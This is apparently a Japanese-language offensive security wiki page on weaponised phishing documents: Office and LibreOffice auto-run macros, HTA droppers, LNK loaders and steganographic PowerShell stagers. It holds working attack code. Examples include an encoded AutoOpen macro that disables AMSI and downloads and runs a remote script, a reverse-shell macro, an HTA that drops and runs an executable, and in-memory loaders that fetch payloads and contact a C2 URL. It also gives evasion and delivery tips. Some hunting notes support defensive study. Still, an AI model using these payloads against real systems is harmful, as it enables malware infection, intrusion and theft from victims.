# Phishing Files & Documents

{{#include ../../banners/hacktricks-training.md}}

## Office Documents

Microsoft Word は、ファイルを開く前にファイルデータの検証を実行します。データ検証は、OfficeOpenXML 標準に基づくデータ構造の識別という形で実行されます。データ構造の識別中にエラーが発生した場合、解析対象のファイルは開かれません。

通常、macro を含む Word ファイルは `.docm` 拡張子を使用します。ただし、ファイル拡張子を変更してファイル名を変更しても、macro の実行機能を維持することが可能です。\
たとえば、RTF ファイルは設計上 macro をサポートしていませんが、RTF に名前を変更した DOCM ファイルは Microsoft Word によって処理され、macro を実行できます。\
同じ内部構造とメカニズムは、Microsoft Office Suite のすべての software（Excel、PowerPoint など）に適用されます。

次の command を使用すると、一部の Office プログラムによって実行される拡張子を確認できます。
```bash
assoc | findstr /i "word excel powerp"
```
DOCXファイルがリモートテンプレート（File –Options –Add-ins –Manage: Templates –Go）を参照しており、そのテンプレートにマクロが含まれている場合、マクロを「実行」することもできます。

### 外部画像の読み込み

次に移動します: _Insert --> Quick Parts --> Field_\
_**Categories**: Links and References、**Filed names**: includePicture、**Filename or URL**:_ http://<ip>/whatever

![Office Documents - 外部画像の読み込み: Insert -- Quick Parts -- Field に移動](<../../images/image (155).png>)

### Macros Backdoor

マクロを使用して、ドキュメントから任意のコードを実行できます。

#### 自動ロード関数

これらが一般的であるほど、AVに検出される可能性が高くなります。

- AutoOpen()
- Document_Open()

#### マクロコードの例
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### メタデータを手動で削除

**ファイル > 情報 > ドキュメントの検査 > ドキュメントの検査**に移動すると、ドキュメント検査が開きます。**検査**をクリックし、**ドキュメントのプロパティと個人情報**の横にある**すべて削除**をクリックします。

#### Doc 拡張子

完了したら、**ファイルの種類**ドロップダウンを選択し、形式を **`.docx`** から **Word 97-2003 `.doc`** に変更します。\
これは、**`.docx` 内には macro を保存できず**、macro が有効な **`.docm`** 拡張子には**悪い印象**があるためです（例：サムネイルアイコンに大きな `!` が表示され、一部の web/email gateway では完全にブロックされます）。したがって、この**旧式の `.doc` 拡張子が最適な妥協案**です。

#### Malicious Macros Generators

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## LibreOffice ODT auto-run macros (Basic)

LibreOffice Writer ドキュメントには Basic macro を埋め込み、macro を**ドキュメントを開く**イベント（ツール → カスタマイズ → イベント → ドキュメントを開く → Macro…）にバインドすることで、ファイルを開いたときに自動実行できます。<sup>[[1]](#references)</sup> 単純な reverse shell macro は次のようになります。
```vb
Sub Shell
Shell("cmd /c powershell -enc BASE64_PAYLOAD"""")
End Sub
```
文字列内の二重引用符（`""`）に注意してください。LibreOffice Basicでは、リテラルの引用符をエスケープするために使用されます。そのため、`...==""")`で終わるpayloadsでは、内部のコマンドとShell引数の両方の構文が正しく保たれます。

Delivery tips:

- `.odt`として保存し、ドキュメントイベントにmacroを割り当てて、開いたときに直ちに実行されるようにします。
- `swaks`でメールを送信するときは、`--attach @resume.odt`を使用してください（添付ファイルとしてファイルの内容を送信するために`@`が必要です。これを付けないとファイル名の文字列が送信されます）。これは、検証なしで任意の`RCPT TO`受信者を受け入れるSMTPサーバーを悪用する場合に重要です。

## HTAファイル

HTAは、**HTMLとスクリプト言語（VBScriptやJScriptなど）を組み合わせた**Windowsプログラムです。ユーザーインターフェースを生成し、ブラウザのセキュリティモデルによる制約を受けずに、「完全に信頼された」アプリケーションとして実行されます。

HTAは**`mshta.exe`**を使用して実行されます。通常、**Internet Explorerとともにインストール**されるため、**`mshta`はIEに依存します**。そのため、IEがアンインストールされている場合、HTAは実行できません。
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## NTLM Authentication の強制

**NTLM authentication を「リモートで強制する」**方法はいくつかあります。たとえば、ユーザーがアクセスするメールや HTML に**不可視画像**を追加できます（HTTP MitM でも可能？）。また、**フォルダーを開くだけで** **authentication** を**トリガー**する**ファイルのアドレス**を被害者に送信することもできます。

**以下のページで、これらのアイデアやその他の方法を確認してください：**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

hash や authentication を盗むだけでなく、**NTLM relay attacks** も**実行できる**ことを忘れないでください：

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP に埋め込まれた Payloads（fileless chain）

非常に効果的なキャンペーンでは、2つの正規の偽装ドキュメント（PDF/DOCX）と悪意のある .lnk を含む ZIP を配布します。仕組みとしては、実際の PowerShell loader が一意の marker の後に ZIP の raw bytes として保存され、.lnk がそれを切り出して完全にメモリ内で実行します。<sup>[[2]](#references)</sup>

通常、.lnk の PowerShell one-liner は次の流れを実装します：

1) Desktop、Downloads、Documents、%TEMP%、%ProgramData%、および現在の working directory の親ディレクトリにある、元の ZIP を特定する。
2) ZIP の bytes を読み込み、ハードコードされた marker（例：xFIQCV）を検索する。marker より後のすべてのデータが、埋め込まれた PowerShell payload になる。
3) ZIP を %ProgramData% にコピーしてそこで展開し、正規のファイルに見せかけるため偽装 .docx を開く。
4) 現在の process に対して AMSI を bypass する：[System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) 次の stage を deobfuscate（例：すべての # 文字を削除）し、メモリ内で実行する。

埋め込まれた stage を切り出して実行する PowerShell skeleton の例：
```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
"$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
"$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```
Notes
- Delivery では、信頼性の高い PaaS subdomain（例: *.herokuapp.com）が悪用されることが多く、payload にゲートを設ける場合があります（IP/UA に基づいて無害な ZIP を提供）。
- 次の stage では、base64/XOR shellcode を復号し、Reflection.Emit + VirtualAlloc 経由で実行することが多く、disk artifacts を最小限に抑えます。

同じ chain で使用される Persistence
- Microsoft Web Browser control の COM TypeLib hijacking。これにより、IE/Explorer またはそれを埋め込む任意の app が payload を自動的に再起動します。<sup>[[2]](#references)[[4]](#references)</sup> 詳細とすぐに使える commands はこちら:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Hunting/IOCs
- archive data の末尾に ASCII marker string（例: xFIQCV）が追加された ZIP files。
- parent/user folders を列挙して ZIP を探し、decoy document を開く .lnk。
- [System.Management.Automation.AmsiUtils]::amsiInitFailed による AMSI tampering。
- trusted PaaS domains 配下で host された links で終了する、長時間実行の business threads。

## LNK decoy-first staging → scheduled-task persistence → trusted CPL side-loading

もう 1 つの繰り返し確認される pattern は、**document-impersonating `.lnk`** であり、無害な lure を直ちに開きながら、real chain をバックグラウンドで staging します。<sup>[[3]](#references)</sup>

Observed workflow:
1. shortcut は **PDF に偽装** し、`conhost.exe` または類似の proxy を使用して、obfuscated PowerShell downloader を spawn します。
2. PowerShell は明白な tokens（`iw''r`、`g''c''i`、`r''e''n`、`c''p''i`、`&(g''cm sch*)`）を fragment 化するため、`iwr`、`gci`、`ren`、`cpi`、または `schtasks` を探す naive detections では command を見逃します。
3. stager はまず **decoy document を download** して victim のために開き、その後 background で malicious files を再構築します。
4. Payloads は **junk extensions** を付けて書き込まれ、その後 filler characters を削除して rename されることがあり、明白な `.exe` / `.cpl` artifacts の出現を遅らせます。
5. Persistence は、user-writable path から trusted host binary を launch する **minute-based scheduled task** によって確立されます。

この pattern から得られる最小限の hunting clues:
```powershell
# Suspicious split-token PowerShell seen in LNK chains
iw''r
r''e''n
&(g''cm sch*) /create /Sc minute /tn GoogleErrorReport /tr "$env:PUBLIC\Fondue"
```
認識しておくと有用な staging レイアウトは次のとおりです。
- `C:\Users\Public\<decoy>.pdf`
- `C:\Users\Public\<trusted>.exe`
- `C:\Users\Public\<malicious>.cpl` または `.dll`
- `C:\Windows\Tasks\<blob>.dat`

### second stage が stealthy である理由

Rapid7 の case study では、scheduled task が **`Fondue.exe`** を `C:\Users\Public\` から繰り返し起動していました。**`APPWIZ.cpl`** がその隣に staging され、**`RunFODW`** を export していたため、trusted な Microsoft binary は正規の system copy ではなく、attacker の CPL を side-load しました。

CPL は次の処理を行います。
- `C:\Windows\Tasks\editor.dat` から **AES-256-CBC** blob を読み取る
- **Windows CNG / `bcrypt.dll`** を介して復号する
- executable memory を allocate し、復号した shellcode をコピーする
- shellcode の pointer を **`EnumUILanguagesW`** の callback として渡し、間接的に実行する

最後の手法は個別に hunting する価値があります。malware は、直接的な `((void(*)())buf)()` jump を避け、代わりに **正当な callback-taking WinAPI** を悪用して execution を移すことがよくあります。

この campaign で復号された payload は **Donut** shellcode でした。その後、最終 PE を完全に memory 上へ map し、execution を引き渡す前に current process 内の **AMSI/WLDP/ETW** を patch しました。side-loading と memory-resident post-processing の詳細については、以下を参照してください。

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/dll-hijacking/README.md
{{#endref}}

{{#ref}}
../../windows-hardening/av-bypass.md
{{#endref}}

実践的な hunting pivot:
- `.lnk` が `powershell.exe` または `conhost.exe` を spawn し、その後に表示用の decoy document が開かれる。
- **`C:\Users\Public\`** への短時間の download の後、意味のない extension から直ちに rename される。
- `GoogleErrorReport` のような目立たない名前の scheduled task が、**user-writable directories** から実行される。
- trusted binaries が、同じ non-system directory から **`.cpl` / `.dll`** files を load する。
- **`C:\Windows\Tasks\`** 配下に Base64 text blob が書き込まれ、その後 side-loaded module によって読み取られる。

## images 内の Steganography-delimited payloads (PowerShell stager)

Recent loader chains は、obfuscated な JavaScript/VBS を配布します。この JavaScript/VBS は Base64 の PowerShell stager を decode して実行します。その stager は image (多くの場合 GIF) を download します。この image には、unique な start/end marker の間に plain text として隠された、Base64-encoded の .NET DLL が含まれています。script はこれらの delimiter (実際の環境で確認された例: «<<sudo_png>> … <<sudo_odt>>>») を検索し、間にある text を抽出して bytes に Base64-decode し、assembly を in-memory で load した後、C2 URL とともに既知の entry method を invoke します。<sup>[[5]](#references)</sup>

Workflow
- Stage 1: Archived JS/VBS dropper → 埋め込まれた Base64 を decode → `-nop -w hidden -ep bypass` を指定して PowerShell stager を launch。
- Stage 2: PowerShell stager → image を download し、marker-delimited Base64 を carve して、.NET DLL を in-memory で load し、C2 URL と options を渡してその method (例: VAI) を call。
- Stage 3: Loader は final payload を取得し、通常は process hollowing を介して trusted binary (一般的には MSBuild.exe) に inject します。<sup>[[7]](#references)[[8]](#references)</sup> process hollowing と trusted utility proxy execution の詳細については、以下を参照してください。

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

image から DLL を carve し、in-memory で .NET method を invoke する PowerShell の例:

<details>
<summary>PowerShell stego payload extractor and loader</summary>
```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
[string]$Url    = 'https://example.com/payload.gif',
[string]$StartM = '<<sudo_png>>',
[string]$EndM   = '<<sudo_odt>>',
[string]$EntryType = 'Loader',
[string]$EntryMeth = 'VAI',
[string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```
</details>

注記
- これは ATT&CK T1027.003（steganography/marker-hiding）です。<sup>[[6]](#references)</sup> マーカーはキャンペーンごとに異なります。
- AMSI/ETW bypass と string deobfuscation は、assembly をロードする前に一般的に適用されます。
- Hunting: ダウンロードされた画像を既知の delimiter についてスキャンし、画像にアクセスして直ちに Base64 blobs を decode する PowerShell を特定します。

stego tools と carving techniques も参照してください：

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## JS/VBS droppers → Base64 PowerShell staging

初期ステージとして、archive 内に小さく、強度に obfuscated された `.js` または `.vbs` が配置されることがよくあります。その唯一の目的は、埋め込まれた Base64 string を decode し、`-nop -w hidden -ep bypass` を指定した PowerShell を起動して、HTTPS 経由で次のステージを bootstrap することです。<sup>[[5]](#references)</sup>

ロジックの骨子（抽象化）：
- 自身の file contents を読み取る
- junk strings の間にある Base64 blob を探す
- ASCII の PowerShell に decode する
- `wscript.exe`/`cscript.exe` から `powershell.exe` を呼び出して実行する

Hunting の手がかり
- command line 内で `-enc`/`FromBase64String` を指定して `powershell.exe` を起動する archived JS/VBS attachments。
- user temp paths から `powershell.exe -nop -w hidden` を起動する `wscript.exe`。

## NTLM hashes を盗むための Windows files

**NTLM creds を盗める場所**に関するページを確認してください：

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}


## References

- [1] [HTB Job – LibreOffice macro → IIS webshell → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [2] [Check Point Research – ZipLine Campaign: 米国企業を標的とする高度な Phishing Attack](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [Rapid7 – Malware à la Mode: China-Themed Loader Chain を通じた Dropping Elephant Tradecraft の追跡](https://www.rapid7.com/blog/post/tr-malware-tracking-dropping-elephant-tradecraft-china-themed-loader-chain)
- [4] [Hijack the TypeLib – 新しい COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [5] [Unit 42 – PhantomVAI Loader がさまざまな Infostealers を配信](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [6] [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [7] [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [8] [MITRE ATT&CK – Trusted Developer Utilities Proxy Execution: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)
{{#include ../../banners/hacktricks-training.md}}
